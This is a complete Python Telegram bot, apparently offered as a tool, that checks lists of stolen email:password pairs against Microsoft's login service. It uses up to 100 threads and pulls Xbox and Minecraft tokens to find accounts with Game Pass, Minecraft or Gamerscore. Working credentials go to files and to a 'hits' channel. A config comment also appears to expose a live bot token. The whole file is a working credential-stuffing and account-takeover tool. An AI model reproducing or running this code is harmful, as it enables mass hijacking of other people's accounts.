# -*- coding: utf-8 -*-
"""
r1ivk XBOX & MINECRAFT CHECKER - Telegram Bot (Single File)
Owner: r1ivk
"""

import os
import re
import time
import queue
import threading
import concurrent.futures
import urllib3
import requests
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

urllib3.disable_warnings()

# ============================================================
# ======================= CONFIG =============================
# ============================================================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"          # <-- 8896382526:AAG7lmuFPHniEXHsMTBzLnw8cBqIf-wPK3w
OWNER_ID = 123456789                        # <-- 6266959915
HITS_CHAT_ID = None                         # <-- ايدي قناة الهيتات (اختياري)

REQUEST_TIMEOUT = 25
DEFAULT_THREADS = 40
MAX_THREADS = 100
LIVE_UPDATE_INTERVAL = 4

# ============================================================
# =================== CHECKER ENGINE =========================
# ============================================================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
    return None


def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).replace('\\/', '/')
    return None


def check_account(combo, timeout=25):
    parts = combo.split(':')
    if len(parts) < 2:
        return {'status': 'bad', 'email': combo, 'password': '', 'combo': combo}

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()

    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
    session = requests.Session()
    session.verify = False
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        r = session.get(sftag_url, timeout=timeout)
        text = r.text
        sftag = extract_ppft(text)
        url_post = extract_url_post(text)

        if not sftag or not url_post:
            session.close()
            return {'status': 'bad', 'email': email, 'password': password, 'combo': combo}

        login_data = {
            'login': email, 'loginfmt': email, 'passwd': password,
            'PPFT': sftag, 'type': '11', 'NewUser': '1',
            'LoginOptions': '3', 'i19': '0',
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': sftag_url,
            'Origin': 'https://login.live.com',
        }
        lr = session.post(url_post, data=login_data, headers=headers,
                          allow_redirects=True, timeout=timeout)
        lt = lr.text.lower()
        ms_token = None

        if 'access_token' in lr.url:
            ms_token = parse_qs(urlparse(lr.url).fragment).get('access_token', [None])[0]
        elif 'access_token' in lt:
            m = re.search(r'access_token=([^&\s\"\']+)', lt)
            if m:
                ms_token = m.group(1)
        elif any(x in lt for x in [
            "password is incorrect", "account doesn't exist",
            "passwords don't match", "that password is incorrect"
        ]):
            session.close()
            return {'status': 'bad', 'email': email, 'password': password, 'combo': combo}
        elif any(x in lt for x in [
            "recover", "identity/confirm", "locked", "help us protect",
            "verify your identity", "security challenge", "two-step"
        ]):
            session.close()
            return {'status': 'twofa', 'email': email, 'password': password, 'combo': combo}

        if not ms_token:
            session.close()
            return {'status': 'bad', 'email': email, 'password': password, 'combo': combo}

        xb_payload = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": ms_token,
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT",
        }
        xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
        xr = session.post('https://user.auth.xboxlive.com/user/authenticate',
                          json=xb_payload, headers=xb_headers, timeout=timeout)
        if xr.status_code != 200:
            session.close()
            return {'status': 'error', 'email': email, 'password': password, 'combo': combo}

        xb_token = xr.json()['Token']
        uhs = xr.json()['DisplayClaims']['xui'][0]['uhs']

        gamertag = "N/A"
        gamerscore = 0
        try:
            xsts_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                "RelyingParty": "http://xboxlive.com",
                "TokenType": "JWT",
            }
            xr2 = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                               json=xsts_payload, headers=xb_headers, timeout=timeout)
            if xr2.status_code == 200:
                xsts_token = xr2.json()['Token']
                pr = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings"
                    "?settings=Gamertag,Gamerscore",
                    headers={
                        "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                        "x-xbl-contract-version": "2",
                    }, timeout=timeout)
                if pr.status_code == 200:
                    settings = pr.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag':
                            gamertag = s['value']
                        elif s['id'] == 'Gamerscore':
                            try:
                                gamerscore = int(s['value'])
                            except Exception:
                                gamerscore = 0
        except Exception:
            pass

        mc_ent_text = ""
        try:
            xsts_mc_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT",
            }
            xr3 = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                               json=xsts_mc_payload, headers=xb_headers, timeout=timeout)
            if xr3.status_code == 200:
                xsts_mc_token = xr3.json()['Token']
                ma = session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"},
                    headers={'Content-Type': 'application/json'}, timeout=timeout)
                if ma.status_code == 200:
                    mc_token = ma.json().get('access_token')
                    if mc_token:
                        er = session.get(
                            'https://api.minecraftservices.com/entitlements/mcstore',
                            headers={'Authorization': f'Bearer {mc_token}'},
                            timeout=timeout)
                        if er.status_code == 200:
                            mc_ent_text = er.text
        except Exception:
            pass

        gp_type = ""
        if 'product_game_pass_ultimate' in mc_ent_text:
            gp_type = "Game Pass Ultimate"
        elif 'product_game_pass_pc' in mc_ent_text:
            gp_type = "PC Game Pass"
        elif 'product_game_pass_console' in mc_ent_text:
            gp_type = "Xbox Game Pass Console"

        has_mc = 'product_minecraft' in mc_ent_text
        has_gp = bool(gp_type)

        if has_gp:
            hit_type = 'gamepass'
        elif has_mc:
            hit_type = 'minecraft'
        elif gamerscore > 0:
            hit_type = 'gscore'
        else:
            session.close()
            return {'status': 'bad', 'email': email, 'password': password, 'combo': combo}

        plain = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Gamertag: {gamertag}\n"
            f"Gamerscore: {gamerscore}\n"
            f"Minecraft: {'Yes' if has_mc else 'No'}\n"
            f"Game Pass: {gp_type if has_gp else 'No'}"
        )

        content = (
            f"🎮 <b>r1ivk XBOX HIT</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔑 <b>Password:</b> <code>{password}</code>\n"
            f"🏷️ <b>Gamertag:</b> <code>{gamertag}</code>\n"
            f"🏆 <b>Gamerscore:</b> <code>{gamerscore}</code>\n"
            f"⛏️ <b>Minecraft:</b> {'✅ Yes' if has_mc else '❌ No'}\n"
            f"🎫 <b>Game Pass:</b> {gp_type if has_gp else '❌ No'}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )

        session.close()
        return {
            'status': 'hit',
            'type': hit_type,
            'email': email,
            'password': password,
            'gamertag': gamertag,
            'gamerscore': gamerscore,
            'has_mc': has_mc,
            'gp_type': gp_type,
            'content': content,
            'plain': plain,
            'combo': combo,
        }

    except requests.exceptions.RequestException:
        session.close()
        return {'status': 'error', 'email': email, 'password': password, 'combo': combo}
    except Exception:
        session.close()
        return {'status': 'error', 'email': email, 'password': password, 'combo': combo}


# ============================================================
# =================== STATE & STORAGE ========================
# ============================================================
stats_lock = threading.Lock()


class Session:
    def __init__(self):
        self.combos = []
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.gamepass = 0
        self.minecraft = 0
        self.gscore = 0
        self.threads = DEFAULT_THREADS
        self.running = False
        self.start_time = 0
        self.executor = None
        self.total = 0
        self.live_msg_id = None
        self.live_chat_id = None
        self.mode = "normal"
        self.queue = queue.Queue()
        self.awaiting = None


SESSIONS = {}


def get_session(uid):
    if uid not in SESSIONS:
        SESSIONS[uid] = Session()
    return SESSIONS[uid]


def ensure_dirs():
    for d in ["XBOX_RESULT", "XBOX_RESULT/users"]:
        if not os.path.exists(d):
            os.makedirs(d)


def save_hit(uid, htype, plain):
    ensure_dirs()
    fname = {
        'gamepass': 'GamePass_Hits.txt',
        'minecraft': 'Minecraft_Hits.txt',
        'gscore': 'GScore_Hits.txt',
    }.get(htype, 'Hits.txt')
    path = os.path.join("XBOX_RESULT", "users", f"{uid}_{fname}")
    with open(path, 'a', encoding='utf-8') as f:
        f.write(plain + "\n" + "=" * 50 + "\n")


def read_hits(uid, htype):
    ensure_dirs()
    fname = {
        'gamepass': 'GamePass_Hits.txt',
        'minecraft': 'Minecraft_Hits.txt',
        'gscore': 'GScore_Hits.txt',
    }.get(htype, 'Hits.txt')
    path = os.path.join("XBOX_RESULT", "users", f"{uid}_{fname}")
    return path if os.path.exists(path) else None


# ============================================================
# ==================== KEYBOARDS =============================
# ============================================================
def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 Upload Combo File", callback_data="up_file")],
        [InlineKeyboardButton("✍️ Paste Combo (Text)", callback_data="up_text")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
         InlineKeyboardButton("📊 Statistics", callback_data="stats")],
        [InlineKeyboardButton("🎫 Game Pass Hits", callback_data="dl_gp")],
        [InlineKeyboardButton("⛏️ Minecraft Hits", callback_data="dl_mc")],
        [InlineKeyboardButton("🏆 G-Score Hits", callback_data="dl_gs")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")],
    ])


def check_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ START CHECK", callback_data="start_check")],
        [InlineKeyboardButton("⏹️ STOP", callback_data="stop_check")],
        [InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


def settings_kb(s):
    mode = "🎯 Hits Only" if s.mode == "hits_only" else "🔍 Normal"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🧵 Threads: {s.threads}", callback_data="set_threads")],
        [InlineKeyboardButton(f"📡 Live Mode: {mode}", callback_data="toggle_mode")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


# ============================================================
# ==================== RENDER ================================
# ============================================================
def stats_text(s):
    elapsed = time.time() - s.start_time if s.start_time else 0
    cpm = int((s.checked / elapsed) * 60) if elapsed > 2 else 0
    status = "🟢 Running" if s.running else "🔴 Stopped"
    pct = (s.checked / s.total * 100) if s.total else 0
    bar_len = 20
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)

    return (
        f"📊 <b>r1ivk XBOX CHECKER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 Status: {status}\n"
        f"🧵 Threads: <code>{s.threads}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Checked:</b> <code>{s.checked} / {s.total}</code>\n"
        f"💎 <b>Hits:</b> <code>{s.hits}</code>\n"
        f"❌ <b>Bad:</b> <code>{s.bad}</code>\n"
        f"🔒 <b>2FA:</b> <code>{s.twofa}</code>\n"
        f"⚠️ <b>Errors:</b> <code>{s.errors}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎫 Game Pass: <code>{s.gamepass}</code>\n"
        f"⛏️ Minecraft: <code>{s.minecraft}</code>\n"
        f"🏆 G-Score: <code>{s.gscore}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
        f"[{bar}] {pct:.1f}%\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: r1ivk"
    )


# ============================================================
# ==================== WORKER ================================
# ============================================================
def start_worker(app, uid):
    s = get_session(uid)
    s.running = True
    s.start_time = time.time()
    s.checked = s.hits = s.bad = s.twofa = s.errors = 0
    s.gamepass = s.minecraft = s.gscore = 0
    s.total = len(s.combos)
    s.executor = concurrent.futures.ThreadPoolExecutor(max_workers=s.threads)

    def process(combo):
        if not s.running:
            return
        res = check_account(combo, timeout=REQUEST_TIMEOUT)
        with stats_lock:
            if res['status'] == 'hit':
                s.hits += 1
                if res['type'] == 'gamepass':
                    s.gamepass += 1
                elif res['type'] == 'minecraft':
                    s.minecraft += 1
                elif res['type'] == 'gscore':
                    s.gscore += 1
                save_hit(uid, res['type'], res['plain'])
                s.queue.put(('hit', res))
            elif res['status'] == 'twofa':
                s.twofa += 1
                s.queue.put(('twofa', res))
            elif res['status'] == 'bad':
                s.bad += 1
            else:
                s.errors += 1
            s.checked += 1

    for c in s.combos:
        s.executor.submit(process, c)

    def runner():
        while s.running and s.checked < s.total:
            time.sleep(0.5)
        s.running = False

    threading.Thread(target=runner, daemon=True).start()

    def broadcaster():
        while s.running or not s.queue.empty():
            try:
                kind, data = s.queue.get(timeout=2)
            except queue.Empty:
                continue
            try:
                if kind == 'hit':
                    app.create_task(
                        app.bot.send_message(
                            chat_id=s.live_chat_id,
                            text=data['content'],
                            parse_mode=ParseMode.HTML))
                    if HITS_CHAT_ID:
                        app.create_task(
                            app.bot.send_message(
                                chat_id=HITS_CHAT_ID,
                                text=data['content'],
                                parse_mode=ParseMode.HTML))
                elif kind == 'twofa' and s.mode == "normal":
                    app.create_task(
                        app.bot.send_message(
                            chat_id=s.live_chat_id,
                            text=f"🔒 <b>2FA Locked:</b> <code>{data['email']}</code>",
                            parse_mode=ParseMode.HTML))
            except Exception:
                pass

    threading.Thread(target=broadcaster, daemon=True).start()

    def live_updater():
        while s.running or s.checked < s.total:
            if s.live_msg_id and s.live_chat_id:
                try:
                    app.create_task(
                        app.bot.edit_message_text(
                            chat_id=s.live_chat_id,
                            message_id=s.live_msg_id,
                            text=stats_text(s),
                            parse_mode=ParseMode.HTML,
                            reply_markup=check_kb()))
                except Exception:
                    pass
            time.sleep(LIVE_UPDATE_INTERVAL)
        if s.live_msg_id and s.live_chat_id:
            try:
                app.create_task(
                    app.bot.edit_message_text(
                        chat_id=s.live_chat_id,
                        message_id=s.live_msg_id,
                        text=stats_text(s) + "\n\n✅ <b>Finished!</b>",
                        parse_mode=ParseMode.HTML,
                        reply_markup=main_kb()))
            except Exception:
                pass

    threading.Thread(target=live_updater, daemon=True).start()


# ============================================================
# =================== HANDLERS ===============================
# ============================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    get_session(uid)
    text = (
        f"👋 Welcome <b>{update.effective_user.first_name}</b>!\n\n"
        f"🎮 <b>r1ivk XBOX &amp; MINECRAFT CHECKER</b>\n"
        f"Advanced checker with live scanning, Game Pass detection, "
        f"Minecraft entitlements, and Gamerscore hits.\n\n"
        f"👇 Choose an option:"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                    reply_markup=main_kb())


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        "ℹ️ <b>How to use:</b>\n\n"
        "1️⃣ Upload a combo file or paste combos (email:password)\n"
        "2️⃣ Press <b>START CHECK</b>\n"
        "3️⃣ Watch live hits and stats\n"
        "4️⃣ Download hits anytime from the menu\n\n"
        "⚙️ <b>Settings:</b> adjust threads (1-100) and live mode\n\n"
        "📌 <b>Supported hits:</b>\n"
        "🎫 Game Pass (Ultimate / PC / Console)\n"
        "⛏️ Minecraft Java\n"
        "🏆 Gamerscore accounts"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, parse_mode=ParseMode.HTML, reply_markup=main_kb())
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                        reply_markup=main_kb())


async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    s = get_session(uid)
    data = q.data

    if data == "back_main":
        s.awaiting = None
        await q.edit_message_text(
            "🏠 <b>Main Menu</b>\n\nChoose an option:",
            parse_mode=ParseMode.HTML, reply_markup=main_kb())
        return

    if data == "help":
        await cmd_help(update, ctx)
        return

    if data == "up_file":
        s.awaiting = "file"
        await q.edit_message_text(
            "📁 <b>Send the combo file now</b>\n"
            "Format: <code>email:password</code> (one per line)\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return

    if data == "up_text":
        s.awaiting = "text"
        await q.edit_message_text(
            "✍️ <b>Paste your combos now</b>\n"
            "One per line: <code>email:password</code>\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return

    if data == "set_threads":
        s.awaiting = "threads"
        await q.edit_message_text(
            f"🧵 <b>Current threads:</b> <code>{s.threads}</code>\n\n"
            f"Send a number between 1 and {MAX_THREADS}.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🔙 Back", callback_data="settings")]]))
        return

    if data == "toggle_mode":
        s.mode = "hits_only" if s.mode == "normal" else "normal"
        await q.edit_message_text(
            "⚙️ <b>Settings</b>\n\nLive mode updated.",
            parse_mode=ParseMode.HTML, reply_markup=settings_kb(s))
        return

    if data == "settings":
        await q.edit_message_text(
            f"⚙️ <b>Settings</b>\n\n"
            f"🧵 Threads: <code>{s.threads}</code>\n"
            f"📡 Live Mode: <code>{s.mode}</code>",
            parse_mode=ParseMode.HTML, reply_markup=settings_kb(s))
        return

    if data == "stats":
        await q.edit_message_text(
            stats_text(s),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🔄 Refresh", callback_data="stats")],
                 [InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return

    if data == "dl_gp":
        path = read_hits(uid, "gamepass")
        if not path:
            await q.answer("No Game Pass hits yet.", show_alert=True)
            return
        with open(path, 'rb') as f:
            await q.message.reply_document(f, filename="GamePass_Hits.txt")
        return

    if data == "dl_mc":
        path = read_hits(uid, "minecraft")
        if not path:
            await q.answer("No Minecraft hits yet.", show_alert=True)
            return
        with open(path, 'rb') as f:
            await q.message.reply_document(f, filename="Minecraft_Hits.txt")
        return

    if data == "dl_gs":
        path = read_hits(uid, "gscore")
        if not path:
            await q.answer("No G-Score hits yet.", show_alert=True)
            return
        with open(path, 'rb') as f:
            await q.message.reply_document(f, filename="GScore_Hits.txt")
        return

    if data == "start_check":
        if s.running:
            await q.answer("Already running!", show_alert=True)
            return
        if not s.combos:
            await q.answer("Upload combos first!", show_alert=True)
            return
        s.live_chat_id = q.message.chat_id
        s.live_msg_id = q.message.message_id
        start_worker(ctx.application, uid)
        await q.edit_message_text(
            stats_text(s) + "\n\n🚀 <b>Checker started...</b>",
            parse_mode=ParseMode.HTML, reply_markup=check_kb())
        return

    if data == "stop_check":
        if not s.running:
            await q.answer("Not running.", show_alert=True)
            return
        s.running = False
        if s.executor:
            s.executor.shutdown(wait=False, cancel_futures=True)
        await q.edit_message_text(
            stats_text(s) + "\n\n⏹️ <b>Stopped by user.</b>",
            parse_mode=ParseMode.HTML, reply_markup=main_kb())
        return


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = get_session(uid)
    txt = update.message.text.strip()

    if txt == "/cancel":
        s.awaiting = None
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb())
        return

    if s.awaiting == "threads":
        try:
            n = int(txt)
            if not (1 <= n <= MAX_THREADS):
                raise ValueError
            s.threads = n
            s.awaiting = None
            await update.message.reply_text(
                f"✅ Threads set to <code>{n}</code>.",
                parse_mode=ParseMode.HTML, reply_markup=settings_kb(s))
        except ValueError:
            await update.message.reply_text(
                f"⚠️ Send a number between 1 and {MAX_THREADS}.")
        return

    if s.awaiting == "text":
        lines = [l.strip() for l in txt.splitlines() if ':' in l and l.strip()]
        if not lines:
            await update.message.reply_text("⚠️ No valid combos found.")
            return
        s.combos = lines
        s.awaiting = None
        await update.message.reply_text(
            f"✅ Loaded <b>{len(lines)}</b> combos.\n\nPress START when ready.",
            parse_mode=ParseMode.HTML, reply_markup=check_kb())
        return

    await update.message.reply_text("Use the menu below 👇",
                                    reply_markup=main_kb())


async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = get_session(uid)
    if s.awaiting != "file":
        await update.message.reply_text("Press 📁 Upload Combo File first.")
        return
    doc = update.message.document
    if not doc.file_name.endswith(('.txt', '.csv', '.log')):
        await update.message.reply_text("⚠️ Send a .txt file.")
        return
    f = await doc.get_file()
    path = f"XBOX_RESULT/combo_{uid}.txt"
    await f.download_to_drive(path)
    with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
        combos = [l.strip() for l in fh if ':' in l and l.strip()]
    os.remove(path)
    if not combos:
        await update.message.reply_text("⚠️ File empty or invalid format.")
        return
    s.combos = combos
    s.awaiting = None
    await update.message.reply_text(
        f"✅ Loaded <b>{len(combos)}</b> combos.\n\nPress START when ready.",
        parse_mode=ParseMode.HTML, reply_markup=check_kb())


# ============================================================
# ======================= MAIN ===============================
# ============================================================
def main():
    ensure_dirs()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("menu", cmd_start))
    app.add_handler(CommandHandler("cancel", on_text))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("🤖 r1ivk XBOX Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
